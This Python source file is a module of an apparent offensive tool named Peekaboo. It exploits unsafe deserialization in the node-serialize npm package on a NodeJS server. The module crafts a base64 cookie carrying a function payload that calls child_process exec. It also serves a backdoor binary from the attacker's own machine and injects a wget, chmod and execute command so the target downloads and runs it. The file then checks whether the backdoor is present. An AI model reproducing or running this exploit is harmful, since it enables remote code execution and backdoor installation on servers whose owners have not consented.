# http_server_side_code_injection.py
#
# This is a Peekaboo Module for SSCI (Server-side code injection) for NodeJS HTTP Server
# ! node-serialize npm module is what allows the exploit due to a vulnerable eval function call ! 
# 
# The node-serialize npm module serialize unserialized data such as a string into it obj form
# e.g '{"ssri": console.log("test test 123"}' is a string that represents a dict 
# node-serialize evals the string into a dict and calls the functions stored with in
#
# This module generates a bad cookie that the NodeJS HTTP implictly trusts even though it is user input
# that can be malicious
#
# This module will ask for the following inputs:
# Port of HTTP Server - Asks for the port the HTTP Server is on
# Endpoint for Injection - Asks for the endpoint (e.g /this/is/a/web/server) for the injection
#
# Editable Consts:
# cmd - The command that is injected using JS code to execute on the linux command line, by default it downloads, makes executable, and executes a backdoor binary
# blind_injection - triggers function call to execute on linux command line
#
# Written by Evan and Richard

import http.server
import socketserver
import threading
import requests
import base64
import json
import sys

# loads utils.py file for commonly used functions and consts
sys.path.append('../')
from utils import WORKING_DIR, MODULES_DIR, LISTS_DIR, bcolors, detect_backdoor

# override the http server request handler to spawn in the backdoor dir
class ModdedSimpleRequestHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory='backdoor/', **kwargs)    

class HTTP_SERVER_SIDE_CODE_INJECTION:

    # MODULE name for module loader
    def name(self):
        return 'HTTP_SERVER_SIDE_CODE_INJECTION'

    def selected(self, localhost, target):
        self.localhost = localhost
        self.target = target
    
        self.port = None

        self.endpoint = None

        # Ask for port number of HTTP Server
        while self.port == None:
            out = input('Enter the Port the HTTP Server is on: ')
            try:
                self.port = int(out)
            except ValueError:
                print('[!] Invalid Port.')

        # Ask for HTTP Server endpoint
        while self.endpoint == None:
            out = input('Enter the Endpoint to perform Injection: ')
            if out:
                self.endpoint = out        


        self.target_url = f'http://{self.target.ip_addr}:{self.port}{self.endpoint}'
        
        # TODO: be able to select binary
        # EDIT for different linux command
        self.cmd = f'wget http://{self.localhost.ip_addr}:8000/tnabd && chmod u+x tnabd && ./tnabd &'
        
        self.blind_injection = "_$$ND_FUNC$$_function (){const { exec } = require('child_process'); exec('" + self.cmd + "')}()"

    # have HTTP Server serve files in local dir
    def serve(self, httpd):
        with httpd:
            httpd.serve_forever()

    def run(self):
      
        print(f'[!] {bcolors.HEADER}HTTP Blind Command Injection Started{bcolors.ENDC}')
        print(f'[*] Spawning HTTP Server for Backdoor Binary Download')    

        # spawn HTTP Server on port 8000 and accessible on LAN
        self.httpd = http.server.HTTPServer(('0.0.0.0', 8000), ModdedSimpleRequestHandler, False)
        self.httpd.allow_reuse_address = True

        # bind server to address and start listening
        self.httpd.server_bind()
        print('[*] HTTP Server binded to 0.0.0.0:8000')
        self.httpd.server_activate()
        print('[*] HTTP Server listening for requests...')        

        # push HTTP Server serving on seprate thread
        thread = threading.Thread(target=self.serve, args=(self.httpd, ))
        thread.setDaemon(True)
        thread.start()

        print(f'[*] Attempting to inject host at {self.target_url} with Backdoor...')
        print(f'[*] Using Command: {bcolors.OKBLUE}{self.cmd}{bcolors.ENDC}')
        print(f'[*] Crafting Bad Cookie for Blind Command Injection...')

        # generate bad cookie
        cookie_dict = {'username': self.blind_injection, 'country': 'Memes', 'city': 'Memes'}
        cookie_str = json.dumps(cookie_dict)
        
        cookie_ascii_bytes = cookie_str.encode('ascii')
        cookie_base64_bytes = base64.b64encode(cookie_ascii_bytes)
        cookie_base64_str = cookie_base64_bytes.decode('ascii')
        
        bad_cookie = {'profile': cookie_base64_str}

        print(f'[*] Bad Cookie created')
        print(f'[*] Attempting Blind Command Injection...')
        print(f'[?] {bcolors.WARNING}HTTP Server should be requested if Successful{bcolors.ENDC}')
        print()

        # make request to target HTTP Server on vulnerable endpoint (Request will timeout, kill after 10 seconds)
        try:
            response = requests.get(self.target_url, cookies=bad_cookie, verify=False, timeout=10)
        except requests.exceptions.Timeout:
            pass

        print()   
        print('[!] Injection Attempted. Rescanning to confirm Success...')

        # check if backdoor was successful spawned
        detect_backdoor(self.target)    

        # Shutdown HTTP Server and rejoin thread to main 
        self.httpd.shutdown()
        thread.join()
        print('[*] Shut down HTTP Server')

        if self.target.backdoor:
            print(f'[!] {bcolors.OKGREEN}Backdoor Detected! >:) Try Connecting{bcolors.ENDC}')
        else:
            print(f'[!] {bcolors.FAIL}No Backdoor Detected! :({bcolors.ENDC}')


